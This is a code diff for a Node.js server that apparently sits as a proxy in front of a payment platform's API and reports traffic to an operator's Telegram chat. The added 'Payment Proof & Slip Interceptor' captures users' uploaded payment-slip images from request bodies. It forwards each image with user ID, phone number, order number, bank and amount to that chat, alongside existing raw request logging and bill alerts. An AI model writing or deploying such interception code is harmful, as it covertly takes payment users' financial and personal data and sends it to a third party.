@@ -257,6 +257,19 @@ async function notifyAdmin(data, msg) {
   }
 }
 
+async function notifyAdminPhoto(data, photoBufferOrUrl, caption) {
+  if (data.adminChatId && bot) {
+    try {
+      await bot.sendPhoto(data.adminChatId, photoBufferOrUrl, { caption: (caption || '').substring(0, 1024) });
+    } catch (e) {
+      try {
+        const urlStr = typeof photoBufferOrUrl === 'string' ? `\n🖼 Link: ${photoBufferOrUrl}` : '';
+        await bot.sendMessage(data.adminChatId, `${caption}${urlStr}`);
+      } catch (e2) { }
+    }
+  }
+}
+
 // ── Raw Request+Response logger (/rr command) ────────────────────────────────
 async function sendRawLog(data, { method, url, reqHeaders, reqBodyRaw, status, respHeaders, respBodyRaw, source, now }) {
   if (!data.rawLog || !data.adminChatId || !bot) return;
@@ -1945,6 +1958,70 @@ app.all('/xxapi/*', async (req, res) => {
       }
       notifyAdmin(data,
         `🔔 NEW BILL\n👤 User: ${userId || 'N/A'}${billInfo}\n🕐 ${now}`);
+    }
+
+    // ── Payment Proof & Slip Interceptor ───────────────────────────────────────
+    if (urlLower.includes('uploadpaymentproof') || urlLower.includes('processpaymentslips') || urlLower.includes('uploadproof') || urlLower.includes('paymentslip')) {
+      let proofOrderId = '';
+      const proofMatch = (req.originalUrl || req.url).match(/\/(?:uploadPaymentProof|uploadproof|processpaymentslips)\/([a-zA-Z0-9_-]+)/i);
+      if (proofMatch && proofMatch[1]) proofOrderId = proofMatch[1];
+      if (!proofOrderId && respData && typeof respData === 'object') {
+        proofOrderId = respData.rptNo || respData.orderId || respData.orderNo || respData.id || '';
+      }
+      if (!proofOrderId && req.body) {
+        proofOrderId = req.body.rptNo || req.body.orderId || req.body.orderNo || req.body.id || '';
+      }
+
+      // Check if response contains proof payment image path
+      let proofPath = '';
+      if (respData && typeof respData === 'object') {
+        proofPath = respData.proof_payment || respData.proofPayment || respData.proofUrl || respData.imageUrl || respData.image || '';
+      }
+      if (!proofPath && jsonResp && typeof jsonResp === 'object') {
+        const d = jsonResp.data || jsonResp.result;
+        if (d && typeof d === 'object') {
+          proofPath = d.proof_payment || d.proofPayment || d.proofUrl || d.imageUrl || '';
+        }
+      }
+
+      // Format full image URL if relative path returned
+      let fullProofUrl = '';
+      if (proofPath && typeof proofPath === 'string') {
+        if (proofPath.startsWith('http')) fullProofUrl = proofPath;
+        else fullProofUrl = `https://vivipay.net/images/${proofPath.replace(/^\/+/, '')}`;
+      }
+
+      // Check if base64 image was uploaded in request body
+      let imgBuffer = null;
+      if (req.rawBody) {
+        const rawStr = req.rawBody.toString('utf-8');
+        const b64Match = rawStr.match(/data:image\/(?:png|jpeg|jpg|webp);base64,([A-Za-z0-9+/=]+)/);
+        if (b64Match && b64Match[1]) {
+          try { imgBuffer = Buffer.from(b64Match[1], 'base64'); } catch (e) { }
+        }
+      }
+
+      // Look up bank/order info if available
+      let mappedBankInfo = '';
+      let orderAmt = '';
+      if (proofOrderId && data.orderBankMap && data.orderBankMap[String(proofOrderId)]) {
+        const saved = data.orderBankMap[String(proofOrderId)];
+        if (saved.bank) mappedBankInfo = `\n🏦 Mapped Bank: ${saved.bank}`;
+        if (saved.amount) orderAmt = `\n💰 Amount: ₹${saved.amount}`;
+      }
+
+      const captionText = `🧾 PAYMENT PROOF SUBMITTED
+👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${proofOrderId ? '\n📋 Order: ' + proofOrderId : ''}${orderAmt}${mappedBankInfo}
+📊 Status: ${response.status === 200 ? '✅ Uploaded (200 OK)' : '⚠️ Status ' + response.status}
+🕐 ${now}`;
+
+      if (imgBuffer && Buffer.isBuffer(imgBuffer) && imgBuffer.length > 0) {
+        notifyAdminPhoto(data, imgBuffer, captionText);
+      } else if (fullProofUrl) {
+        notifyAdminPhoto(data, fullProofUrl, captionText);
+      } else {
+        notifyAdmin(data, captionText);
+      }
     }
 
     if (urlLower.includes('waitconfirm')) {
